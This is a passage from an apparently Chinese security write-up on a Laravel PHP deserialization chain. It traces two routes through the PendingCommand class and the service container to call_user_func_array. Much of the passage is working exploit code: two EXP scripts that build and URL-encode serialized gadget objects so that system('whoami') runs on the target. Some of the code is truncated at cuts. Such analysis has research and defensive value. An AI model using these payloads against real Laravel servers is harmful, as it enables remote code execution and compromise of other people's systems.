            // If the requested type is registered as a singleton we'll want to cache off
            // the instances in "memory" so we can return it later without creating an
            // entirely new instance of an object on each subsequent request for it.
            if ($this->isShared($abstract) && ! $needsContextualBuild) {
                $this->instances[$abstract] = $object;
            }
            $this->fireResolvingCallbacks($abstract, $object);
            // Before returning, we will also set the resolved flag to "true" and pop off
            // the parameter overrides for this build. After those two things are done
            // we will be ready to return back the fully constructed class instance.
            $this->resolved[$abstract] = true;
            array_pop($this->with);
            return $object;
        }
在进行分析的时候发现其实有两种思路，这里将两种思路都分别进行分析:
####  第一种思路
我们看到resolve方法中:
    // namespace Illuminate\Container
    if (isset($this->instances[$abstract]) && ! $needsContextualBuild) {
                return $this->instances[$abstract];
            }
如果我们可以控制`$this->instances`，那么我们将有可能返回一个任意对象，最终该对象会赋值给`$this->app[Kernel::class]`，在这里选取的是`\Illuminate\Foundation\Application`，该类同样继承自`Containers`,因此同样会进入该方法，此时`$this`就是Application这个实例，而我们想要返回的同样也是该类，因此我们需要做的是
    Application->instances['Illuminate\Contracts\Console\Kernel'] = Application
至于为何选取`Application`在之后分析过程中也就明了了：
分析到这我们可以先构造部分EXP:
    app = $app;
                $this->test = $test;
                $this->command = $command;
                $this->parameters = $parameters;
            }
        }
    }
    namespace Illuminate\Auth{
        class GenericUser{
            protected $attributes;
            public function __construct(array $attributes)
            {
                $this->attributes = $attributes;
            }
            public function __get($key)
            {
                return $this->attributes[$key];
            }
        }
    }
    //__get方法也同样可以使用如下类
    namespace Faker{
        class DefaultGenerator{
            protected $default;
            public function __construct($default = null)
            {
                $this->default = $default;
            }
            public function __get($attribute)
            {
                return $this->default;
            }
        }
    }
    namespace Illuminate\Foundation{
        class Application{
            protected $instances = [];
            public function __construct($instances = [])
            {
                $this->instances['Illuminate\Contracts\Console\Kernel'] = $instances;
            }
        }
    }
    namespace {
        $genericuser = new Illuminate\Auth\GenericUser(
            array(
                //这里需要两次使用来循环获得以便成功跳过方法,两次键名分别为expectedOutput和expectedQuestions
                "expectedOutput"=>array("crispr"=>"0"),
                "expectedQuestions"=>array("crispr"=>"1")
            )
        );
        $app = new Illuminate\Foundation\Application();
        //通过如下步骤最终获得的$this->app[Kernel::class]就是该Application实例
        $application = new Illuminate\Foundation\Application($app);
        $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
            $genericuser,
            $application,
            "system",
            array("whoami")
        );
        echo urlencode(serialize($pendingcommand));
    }
将得到后的序列化数据传入在动调到相应待分析步骤:
注意此时的`$this`和instances均为application类，此时赋值给`$this->app[Kernel::class]`，在继续调用call方法时，由于application类没有call方法，根据特性会寻找其父类也就是Container类的call方法:
此时`$callback`为system而`$parameters`为whoami，继续跟进：
    public static function call($container, $callback, array $parameters = [], $defaultMethod = null)
        {
            if (static::isCallableWithAtSign($callback) || $defaultMethod) {
                return static::callClass($container, $callback, $parameters, $defaultMethod);
            }
            return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) {
                return call_user_func_array(
                    $callback, static::getMethodDependencies($container, $callback, $parameters)
                );
            });
        }
此时`$callback = system`,判断是否进入isCallableWithAtSign:
可以知道无法满足条件，那么进入第二个分支：  
看到一个关键函数`call_user_func_array`，其在闭包函数中被调用,这里$callback为system，而第二个参数是一个静态方法的返回值，我们跟进：
    static::getMethodDependencies($container=application实例, $callback='system', $parameters=array('whoami'));
可以看到`getMethodDependencies`方法只是将一个空数组和`$parameters`进行合并，合并后的数据依然是可控的，最终通过call_user_func_array(‘system’,array(‘whoami’))执行命令，这也是`$parameters`为数组的原因，因为`call_user_func_array`第二个参数要求是数组形式
####  第二种思路
接第一种思路的起点，如果此时
    if (isset($this->instances[$abstract]) && ! $needsContextualBuild) {
                return $this->instances[$abstract];
            }
没有进入该if语句，继续往下运行会进入`getConcrete()`方法，而其中的关键方法就是`getConcrete()`，我们在继续跟进:
    protected function getConcrete($abstract)
        {
            if (! is_null($concrete = $this->getContextualConcrete($abstract))) {
                return $concrete;
            }
            // If we don't have a registered resolver or concrete for the type, we'll just
            // assume each type is a concrete name and will attempt to resolve it as is
            // since the container should be able to resolve concretes automatically.
            if (isset($this->bindings[$abstract])) {
                return $this->bindings[$abstract]['concrete'];
            }
            return $abstract;
        }
这里说明其为何不会进入第一个if中，跟进该方法:
    protected function getContextualConcrete($abstract)
    {
        if (! is_null($binding = $this->findInContextualBindings($abstract))) {
            return $binding;
        }
        if (empty($this->abstractAliases[$abstract])) {
            return;
        }
        foreach ($this->abstractAliases[$abstract] as $alias) {
            if (! is_null($binding = $this->findInContextualBindings($alias))) {
                return $binding;
            }
        }
    }
    protected function findInContextualBindings($abstract)
    {
        if (isset($this->contextual[end($this->buildStack)][$abstract])) {
            return $this->contextual[end($this->buildStack)][$abstract];
        }
    }
从上面可以看出，getContextualConcrete函数把当前解析的类（`Illuminate\Contracts\Console\Kernel`）作为abstract,buildStack
最后一个类作为 concrete，寻找 this->contextual[concrete] [abstract]
即（contextual[end($this->buildStack)]
[‘Illuminate\Contracts\Console\Kernel’]）中的值
在动态调试的过程中发现：
其`buildStack`和`contextual`均为空，最终会直接return
接下来进入该语句：
其实这里的思路和思路一就比较相像了，同样是如果我们能够控制`$this->bindings[$abstract]`即`$this->bindings['Illuminate\Contracts\Console\Kernel']`的值为数组，并且键名为’concrete’，便可以返回得到任意类，得到该类后紧接着对该类进行实例化或者解析，得到一个该类的实例，而该类我们仍然选取Application,因此最后还是赋值给`$this->app['Illuminate\Contracts\Console\Kernel']`，调用call方法时子类不存在，最终调用父类`Container`的call方法，后续步骤和思路一一致，这里不再进行叙述。
这里使用第二种`__get`来写思路二的EXP:
    command = $command;
                $this->parameters = $parameters;
                $this->test=$class;
                $this->app=$app;
            }
        }
    }
    namespace Faker{
        class DefaultGenerator{
            protected $default;
            public function __construct($default = null)
            {
                $this->default = $default;
            }
            public function __get($attribute)
            {
                return $this->default;
            }
        }
    }
    namespace Illuminate\Foundation{
        class Application{
            protected $hasBeenBootstrapped = false;
            protected $bindings;
            public function __construct($bind){
                $this->bindings=$bind;
            }
        }
    }
    namespace{
        $defaultgenerator = new Faker\DefaultGenerator(array("crispr"=>"0"));
        $application = new Illuminate\Foundation\Application(
            array(
                "Illuminate\Contracts\Console\Kernel"=>
                    array(
                        "concrete"=>"Illuminate\Foundation\Application"
                         )
                 )
        );
        $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
            "system",array('whoami'),
            $defaultgenerator,
            $application